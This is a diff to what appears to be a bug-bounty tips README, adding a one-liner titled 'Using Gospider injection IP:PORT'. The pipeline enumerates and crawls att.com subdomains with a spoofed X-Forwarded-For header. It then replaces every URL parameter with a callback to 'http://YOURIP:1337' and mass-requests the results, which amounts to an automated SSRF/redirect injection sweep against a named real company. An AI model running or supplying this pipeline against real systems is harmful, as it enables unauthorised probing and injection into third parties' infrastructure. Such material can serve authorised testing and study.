@@ -207,6 +207,15 @@ gospider -S domain.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https:
 apktool d app.apk -o uberApk;grep -Phro "(https?://)[\w\.-/]+[\"'\`]" uberApk/ | sed 's#"##g' | anew | grep -v "w3\|android\|github\|schemas.android\|google\|goo.gl"
 ```
 
+###  Using Gospider injection IP:PORT 
+> @OFJAAAH
+> @b51b5b43
+
+- [Explained comand](https://bit.ly/3gFJbpB)
+
+```bash
+chaos -d att.com -o att -silent | httpx -silent | anew att1 | xargs -P100 -I@ gospider -c 30 -t 15 -d 4 -a -H "x-forwarded-for: 127.0.0.1" -H "User-Agent: Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1" -S @ |grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace 'http://YOURIP:1337' | anew | grep 'att.com ' | xargs -I@ -P300 curl -sL --max-time 3 @ | httpx -silent -sr att
+```
 
 # Project
 
